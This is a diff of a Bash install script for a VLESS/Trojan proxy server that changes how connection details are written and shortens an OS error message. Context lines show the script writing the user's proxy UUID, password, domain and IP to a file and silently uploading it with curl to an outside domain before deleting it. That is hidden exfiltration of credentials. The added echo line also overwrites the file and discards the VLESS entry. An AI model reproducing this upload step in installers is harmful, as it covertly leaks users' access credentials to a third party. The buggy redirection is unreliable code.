@@ -185,6 +185,7 @@ apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
 echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip})" &> ${myip}.txt
+echo "" &> ${myip}.txt
 echo "trojan://${password1}@${domain}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip})" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
@@ -229,8 +230,8 @@ if cat /etc/*release | grep ^NAME | grep -q Ubuntu; then
   apt-get update
   apt-get install sudo whiptail curl dnsutils locales lsb-release jq -y
  else
-  whiptail --title "操作系统不支援 OS incompatible" --msgbox "请使用Debian或者Ubuntu运行本项目 Please use Debian or Ubuntu to run this project" 8 68
-  echo "操作系统不支援,请使用Debian或者Ubuntu运行本项目 OS incompatible,Please use Debian or Ubuntu to run this project."
+  whiptail --title "操作系统不支援 OS incompatible" --msgbox "请使用Debian或者Ubuntu运行 Please use Debian or Ubuntu to run" 8 68
+  echo "操作系统不支援,请使用Debian或者Ubuntu运行 Please use Debian or Ubuntu."
   exit 1;
 fi
 
